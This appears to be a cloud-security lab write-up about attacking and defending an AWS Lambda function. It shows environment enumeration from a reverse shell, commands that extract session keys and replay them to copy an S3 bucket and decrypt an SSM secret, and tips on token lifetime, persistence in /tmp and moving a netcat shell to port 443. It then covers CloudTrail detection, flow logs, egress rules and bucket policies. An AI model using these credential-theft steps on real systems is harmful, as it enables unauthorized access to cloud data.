# AWS Lambda

## Execution Environment

```
id
uid=496(sbx_user1051) gid=495 groups=495
```

```
whoami
sbx_user1051
```

```
pwd
/var/task
```

```
ls -la
total 236
...
drwxrwxr-x  2 root root     34 Jan  6 16:16 assets
-rw-r--r--  1 root root    221 Jan  1  1980 config.json
drwxrwxr-x  2 root root     31 Jan  6 16:16 docs
-rw-r--r--  1 root root    314 Jan  1  1980 .eslintrc.json
-rw-r--r--  1 root root   1618 Jan  1  1980 handler.js
drwxrwxr-x  3 root root     27 Jan  6 16:16 node_modules
-rw-r--r--  1 root root   1101 Jan  1  1980 package.json
-rw-r--r--  1 root root   2888 Jan  1  1980 README.md
```

```
cat config.json
{
    "dev": {
        "database": {
            "user": "panther_user",
            "pass": "RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9u4oCZdCBrbm93IGV2aWwgb3IgamVhbG91c3kgb3IgZGlzY29udGVudC4="
        }
    }
}
```

```
ls /
bin
boot
cloudsql
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
serve
srv
start
sys
tmp
usr
var
```

```
cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
VARIANT_ID="201910291416-al2.210.0"
```

```
echo "test" > test.txt
/bin/sh: line 7: test.txt: Read-only file system
```

```
env
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=ABC123
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LAMBDA_TASK_ROOT=/var/task
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/panther-dev-panther
AWS_LAMBDA_LOG_STREAM_NAME=2020/01/05/[$LATEST]786a619211474ab1abe53a27eb390c0a
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_EXECUTION_ENV=AWS_Lambda_nodejs12.x
AWS_LAMBDA_FUNCTION_NAME=panther-dev-panther
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=abc123
LANG=en_US.UTF-8
LAMBDA_RUNTIME_DIR=/var/runtime
TZ=:UTC
AWS_REGION=us-east-1
NODE_PATH=/opt/nodejs/node12/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules
AWS_ACCESS_KEY_ID=abc123
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
_X_AMZN_TRACE_ID=Root=1-5e126873-5371714038dfaa8cb41e3de0;Parent=74f98cb5549ebe41;Sampled=0
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=handler.panther
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1024
_=/usr/bin/env
```

## Token Pivoting

### Retrieving Access Keys

Within a Panther reverse shell session:

```bash
env | grep 'ACCESS\|SESSION'
```

### Accessing Private Resources

On your local machine, export the environment variables retrieved in the previous step:

```bash
export AWS_ACCESS_KEY_ID=<ENTER KEY ID>
export AWS_SECRET_ACCESS_KEY=<ENTER SECRET ACCESS KEY>
export AWS_SESSION_TOKEN=<ENTER SESSION TOKEN>
```

Run the following commands:

```bash
aws s3 sync s3://panther-[BUCKET_UUID] ~/panther
aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1
```

Running the following test once per hour for expired keys:

```bash
while true; do aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1; date; sleep 3600; done
```

Expiration does not appear to occur until 12 hours after extracting the token.

## Persistence

Persisting a malware payload into the runtime environment:

```
echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```
Waiting approximately 3 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

After approximately 15 minutes, still there:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 11 minutes of inactivity:

```
cat /tmp/malware.sh
cat: /tmp/malware.sh: No such file or directory
```

## Monitoring &amp; Incident Response

### CloudWatch Logs

Logs and telemetry are automatically sent to CloudWatch. The AWSLambdaBasicExecutionRole provides full write access to write log events.

CloudWatch Insights query for function invocations:

```
fields @timestamp, @message
| filter EventId = 1
| sort @timestamp desc
| limit 20
```

CloudWatch Insights query for the secret being provisioned to the function:

```
fields @timestamp, @message
| filter EventId = 8
| sort @timestamp desc
| limit 20
```

CloudTrail is the audit service providing intel for stolen credentials. Filter events by the user name  `panther-dev-panther`. You will see normal activity from the function executing:

```json
{
    "eventVersion": "1.05",
    "userIdentity": {
        "type": "AssumedRole",
        "principalId": "ABC123:panther-dev-panther",
        "arn": "arn:aws:sts::1234567890:assumed-role/panther-dev-us-east-1-lambdaRole/panther-dev-panther",
        "accountId": "1234567890",
        "accessKeyId": "ASIA54BL6PJRS2Q3ELOQ",
        "sessionContext": {
            "sessionIssuer": {
                "type": "Role",
                "principalId": "ABC123",
                "arn": "arn:aws:iam::1234567890:role/panther-dev-us-east-1-lambdaRole",
                "accountId": "1234567890",
                "userName": "panther-dev-us-east-1-lambdaRole"
            },
            "webIdFederationData": {},
            "attributes": {
                "mfaAuthenticated": "false",
                "creationDate": "2020-01-22T22:20:50Z"
            }
        }
    },
    "eventTime": "2020-01-22T22:20:50Z",
    "eventSource": "ssm.amazonaws.com",
    "eventName": "GetParameter",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "34.229.167.179",
    "userAgent": "aws-sdk-nodejs/2.585.0 linux/v12.14.1 exec-env/AWS_Lambda_nodejs12.x promise",
    "requestParameters": {
        "name": "/panther/database/password",
        "withDecryption": true
    },
    "responseElements": null,
    "requestID": "c3ed9570-7ad1-48dc-80a0-b91d294d5c49",
    "eventID": "7492e9ea-2241-4035-be36-eeed15ccbf0c",
    "readOnly": true,
    "eventType": "AwsApiCall",
    "recipientAccountId": "1234567890"
}
```

After stealing and compromising the token, notice the following CloudTrail entry that has an interesting IP address and user agent.

```json
{
    "eventVersion": "1.05",
    "userIdentity": {
        "type": "AssumedRole",
        "principalId": "ABC123:panther-dev-panther",
        "arn": "arn:aws:sts::1234567890:assumed-role/panther-dev-us-east-1-lambdaRole/panther-dev-panther",
        "accountId": "1234567890",
        "accessKeyId": "ASIA54BL6PJRS2Q3ELOQ",
        "sessionContext": {
            "sessionIssuer": {
                "type": "Role",
                "principalId": "ABC123",
                "arn": "arn:aws:iam::1234567890:role/panther-dev-us-east-1-lambdaRole",
                "accountId": "1234567890",
                "userName": "panther-dev-us-east-1-lambdaRole"
            },
            "webIdFederationData": {},
            "attributes": {
                "mfaAuthenticated": "false",
                "creationDate": "2020-01-22T22:20:50Z"
            }
        }
    },
    "eventTime": "2020-01-22T22:22:59Z",
    "eventSource": "ssm.amazonaws.com",
    "eventName": "GetParameter",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "95.025.143.109",
    "userAgent": "aws-cli/1.16.300 Python/3.7.5 Darwin/19.2.0 botocore/1.13.36",
    "requestParameters": {
        "name": "/panther/database/password",
        "withDecryption": true
    },
    "responseElements": null,
    "requestID": "9b789100-5032-4795-906d-1bac5ca43e52",
    "eventID": "fdc4adce-9499-472b-bba7-b43b716bfe3d",
    "readOnly": true,
    "eventType": "AwsApiCall",
    "recipientAccountId": "1234567890"
}
```

Major signs something has gone wrong here. Note the IP address assigned to the function during its execution:

```json
"userIdentity": {
        "type": "AssumedRole",
        "principalId": "ABC123:panther-dev-panther",
        "arn": "arn:aws:sts::1234567890:assumed-role/panther-dev-us-east-1-lambdaRole/panther-dev-panther",
        "accountId": "1234567890",
        "accessKeyId": "ASIA54BL6PJRS2Q3ELOQ",
},
"sourceIPAddress": "34.229.167.179",
"userAgent": "aws-sdk-nodejs/2.585.0 linux/v12.14.1 exec-env/AWS_Lambda_nodejs12.x promise",
```

Then, minutes later the same user id makes a request from the CLI from a remote IP:

```json
"userIdentity": {
        "type": "AssumedRole",
        "principalId": "ABC123:panther-dev-panther",
        "arn": "arn:aws:sts::1234567890:assumed-role/panther-dev-us-east-1-lambdaRole/panther-dev-panther",
        "accountId": "1234567890",
        "accessKeyId": "ASIA54BL6PJRS2Q3ELOQ",
},
"sourceIPAddress": "95.025.143.109",
"userAgent": "aws-cli/1.16.300 Python/3.7.5 Darwin/19.2.0 botocore/1.13.36",
```

## VPC Configuration

Uncommenting the remaining VPC resources in the serverless.yml file allows us to connect the function to a VPC and apply network controls to the serverless function's traffic. By default, if you do not use a NAT Gateway to manage outbound traffic, the function is completely shielded from the outside world. However, this kills all interaction w/ AWS services as well. For example: CloudWatch logging stops because the function cannot reach the AWS logs API. Fun fact: There isn't a private endpoint for logging!?!?

Let's be honest, very few functions can operate disconnected. So, we hook up the NAT Gateway and bite the bullet on the $30 / month for this appliance. Now everything is network controlled. So let's see how we can start to monitor the function for our payload.

### VPC Flow Logs

Redeploy your function stack with the following environment variable set:

```
export IN_VPC=true
```

Notice that it enables a VPC connected function with flow logging enabled:

```
flowLog:
  Type: AWS::EC2::FlowLog
    Properties:
      DeliverLogsPermissionArn: !GetAtt flowLogRole.Arn
      LogGroupName: !Sub "/aws/lambda/vpc/panther/flowlog"
      ResourceId: !Ref lambdaVpc
      ResourceType: "VPC"
      TrafficType: "REJECT"
flowLogRole:
  Type: AWS::IAM::Role
    Properties:
      Path: "/"
      AssumeRolePolicyDocument: |
        {
            "Statement": [{
                "Effect": "Allow",
                "Principal": { "Service": [ "vpc-flow-logs.amazonaws.com" ]},
                "Action": [ "sts:AssumeRole" ]
            }]
        }
      Policies:
        - PolicyName: "panther-dev-flowlog"
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
            - Action:
                - "logs:CreateLogGroup"
                - "logs:CreateLogStream"
                - "logs:DescribeLogGroups"
                - "logs:DescribeLogStreams"
                - "logs:PutLogEvents"
                Effect: "Allow"
                Resource: "*"  
```

### Security Group Egress Filtering

The default egress rule allows all traffic on all ports. The following security group egress filter attached to our function's network interface definitely stops the original `nc` command:

```
securityGroup:
  Type: "AWS::EC2::SecurityGroup"
    Properties:
      VpcId: !Ref lambdaVpc
      GroupDescription: "Security group for panther."
      SecurityGroupEgress:
        - CidrIp: "0.0.0.0/0"
          IpProtocol: "TCP"
          FromPort: 443
          ToPort: 443
          Description: "Outbound 443 only."
```

Try to stand up the function's reverse shell again on port 1042. The function will eventually timeout. Open CloudWatch and run the following CloudWatch Insights query to find the rejected packets in the function's VPC:

```
fields @timestamp, @message
| filter srcAddr like "10.42"
| sort @timestamp desc
| limit 20
```

From the AWS CLI, you can run the following command to view all traffic for the function's VPC:

```
aws logs start-query --log-group-name "/aws/lambda/vpc/panther/flowlog" --start-time $(date -v -7d +"%s") --end-time $(date +%s) --query-string 'fields @timestamp, @message | filter srcAddr like "10.42"'

aws logs get-query-results --query-id [ENTER_QUERY_ID]
```

Notice we have now detected the malicious traffic blocked by the security group:

```
@ingestionTime 1579821761717
@log 953574914659:/aws/lambda/vpc/panther/flowlog
@logStream eni-0cf6d68d132b7eb99-reject
@message 2 953574914659 eni-0cf6d68d132b7eb99 10.42.2.114 18.191.152.201 58812 1042 6 2 120 1579821675 1579821684 REJECT OK
@timestamp 1579821675000
accountId 953574914659
action REJECT
bytes 120
dstAddr 18.191.152.201
dstPort 1042
end 1579821684
interfaceId eni-0cf6d68d132b7eb99
logStatus OK
packets 2
protocol 6
srcAddr 10.42.2.114
srcPort 58812
start 1579821675
version 2
```

### VPC Endpoints

But, that doesn't get us too far. As you can just switch the `nc` command to bind on port `443` (the allowed port) and the attack is working again. Plus we have a filter on the VPC flow for reject packets only, so we won't even see the 443 successful connection. VPC Endpoints will allow us to shield resources used by the function from being consumed from outside of the VPC.

Take a look at the VPC Endpoint in the yml:

```
s3Endpoint:
  Type: AWS::EC2::VPCEndpoint
  Properties:
    PolicyDocument: |
      {
        "Statement": [{
          "Effect": "Allow",
          "Principal": "*",
          "Action": [ "s3:*" ]
        }]
      }
    RouteTableIds:
        - !Ref privateRouteTable
    ServiceName: "com.amazonaws.us-east-1.s3"
    VpcId: !Ref lambdaVpc
```

We are creating an internal route to the S3 service from inside our VPC. This allows connections without going out over the public Internet into the public facing S3 service.

### VPC Endpoint Bucket Policy

To fully protect our panther bucket, we need to force requests coming from the function execution role to originate from the VPC. Otherwise, it's safe to assume the credential is compromised.

Enter the last resource, the bucket policy:

```
bucketPolicy:
  Type: "AWS::S3::BucketPolicy"
  Properties:
    Bucket: !Ref bucket
    PolicyDocument:
      Version: "2012-10-17"
      Statement:
        - Effect: "Deny"
          Principal: 
            AWS:
              - Fn::GetAtt: [ "IamRoleLambdaExecution", "Arn" ]
            Action:
              - "s3:*"
            Resource: 
              - Fn::Join: ["", ["arn:aws:s3:::", !Ref bucket ] ]
              - Fn::Join: ["", ["arn:aws:s3:::", !Ref bucket, "/*"] ]
            Condition:
              StringNotEquals:
                "aws:sourceVpce": !Ref lambdaVpc
```

Replay the token pivoting attack again, extract the credentials to your machine, set your environment variables, and observe the response from S3 this time:

```bash
aws s3api list-objects --bucket panther-[BUCKET_UUID]
An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
```

```bash
aws s3 cp s3://panther-[BUCKET_UUID]/assets/panther.jpg .
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

Streaming the CloudTrail logs to Athena is the easiest way to query the audit data from this attack. The following query will display the function execution audit activity:

```
SELECT
 eventsource, eventname, errorcode, sourceipaddress, eventtime, vpcendpointid
FROM cloudtrail_logs_audit_logging
WHERE useridentity.arn LIKE '%panther-dev-panther'
ORDER BY eventtime desc
```

From the AWS CLI, run the following command to see all activity from the function execution role:

```
aws athena start-query-execution --query-execution-context "Database=default" --result-configuration "OutputLocation=s3://[YOUR_OUTPUT_BUCKET]/" --query-string "SELECT eventsource, eventname, errorcode, sourceipaddress, eventtime, vpcendpointid FROM cloudtrail_logs_sans_sec540_audit_logging WHERE useridentity.arn LIKE '%panther-dev-panther' ORDER BY eventtime"

aws athena get-query-results --query-execution-id [EXECUTION_ID] | jq '.ResultSet.Rows[].Data | select(.[2].VarCharValue == "AccessDenied")'
```

## Cold Start Times

This is just for fun. Running the following command a few times to see the cold versus warm start metrics. This will invoke the function without any reverse shell data (simulating starting and stopping the function), and retrieve the response time.

```bash
curl "https://YOUR_API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/dev/api/Panther" -s -o /dev/null -w "%{time_starttransfer}\n"  -H "X-API-Key: YOUR_API_KEY"
```

### No VPC Integration

Cold to warm metrics:

```
Request 1: 0.787140
Request 2: 0.229080
Request 3: 0.221466
```

### With VPC Integration

Cold to warm metrics:

```
Request 1: 1.333965
Request 2: 0.391702
Request 3: 0.303685
```
